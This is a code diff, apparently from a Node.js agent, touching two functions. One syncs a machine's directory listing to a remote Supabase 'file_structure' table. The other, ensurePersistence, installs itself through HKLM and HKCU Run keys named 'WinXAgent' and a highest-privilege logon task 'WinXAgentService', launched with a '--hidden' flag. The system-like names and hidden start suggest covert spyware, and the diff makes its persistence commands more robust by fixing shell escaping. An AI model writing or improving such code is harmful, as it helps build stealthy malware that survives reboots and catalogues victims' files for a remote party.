@@ -109,16 +109,16 @@ async function scanDirectory(dirPath, foldersOnly = false) {
     if (fetchError) throw fetchError;
 
     // 2. Identify records that are immediate children of the target directory
-    const dbChildren = (dbRecords || []).filter(r => path.dirname(r.path) === target);
+    const dbChildren = (dbRecords || []).filter(r => path.dirname(r.path).toLowerCase() === target.toLowerCase());
     
-    const localPaths = new Set(records.map(r => r.path));
-    const dbPathsMap = new Map(dbChildren.map(r => [r.path, r.id]));
+    const localPaths = new Set(records.map(r => r.path.toLowerCase()));
+    const dbPathsMap = new Map(dbChildren.map(r => [r.path.toLowerCase(), r.id]));
 
     // 3. Find IDs to delete (items in DB but no longer on disk)
-    const idsToDelete = dbChildren.filter(r => !localPaths.has(r.path)).map(r => r.id);
+    const idsToDelete = dbChildren.filter(r => !localPaths.has(r.path.toLowerCase())).map(r => r.id);
 
     // 4. Find records to insert (items on disk but not in DB)
-    const itemsToInsert = records.filter(r => !dbPathsMap.has(r.path));
+    const itemsToInsert = records.filter(r => !dbPathsMap.has(r.path.toLowerCase()));
 
     if (idsToDelete.length > 0) await supabase.from('file_structure').delete().in('id', idsToDelete);
     if (itemsToInsert.length > 0) await supabase.from('file_structure').insert(itemsToInsert);
@@ -138,11 +138,12 @@ async function ensurePersistence(targetPath) {
   const isCompiled = Boolean(process.pkg);
   const escapedPath = targetPath.includes(' ') ? `\\"${targetPath}\\"` : targetPath;
   const cmdPath = isCompiled ? `${escapedPath} --hidden` : `node ${escapedPath} --hidden`;
+  const shellEscaped = cmdPath.replace(/"/g, '\\"');
 
-  const regCmd = `reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${cmdPath}" /f`;
-  const hkcuCmd = `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${cmdPath}" /f`;
+  const regCmd = `reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${shellEscaped}" /f`;
+  const hkcuCmd = `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${shellEscaped}" /f`;
   const taskName = "WinXAgentService";
-  const taskCmd = `schtasks /create /tn "${taskName}" /tr "${cmdPath}" /sc onlogon /rl highest /f`;
+  const taskCmd = `schtasks /create /tn "${taskName}" /tr "${shellEscaped}" /sc onlogon /rl highest /f`;
 
   const run = (cmd) => new Promise(resolve => exec(cmd, (err) => resolve(err)));
 
